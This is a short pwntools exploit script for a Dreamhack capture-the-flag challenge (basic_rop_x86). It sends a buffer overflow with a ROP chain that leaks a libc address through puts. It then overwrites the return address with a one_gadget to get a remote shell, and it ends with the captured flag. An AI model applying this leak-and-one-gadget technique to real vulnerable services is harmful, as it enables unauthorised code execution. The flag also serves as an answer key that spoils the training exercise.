from pwn import *
libc = ELF("./libc.so.6")
exe = ELF("./basic_rop_x86_patched")
r = remote("host3.dreamhack.games", 16535)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+45
#            c
#            ''')
input()
pop_ebp = 0x0804868b

payload = b"A"*0x48
payload += p32(exe.plt['puts'])
payload += p32(pop_ebp)
payload += p32(exe.got['puts'])
payload += p32(exe.sym['main'])
r.send(payload)

r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))
libc.address = leak1 - 389440

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
log.info("base libc " + hex(libc.address))

one_gadget = libc.address + 0x3a812
payload2 = b"a" * 0x48 + p32(one_gadget)
r.send(payload2)

r.interactive()

# DH{ff3976e1fcdb03267e8d1451e56b90a5}
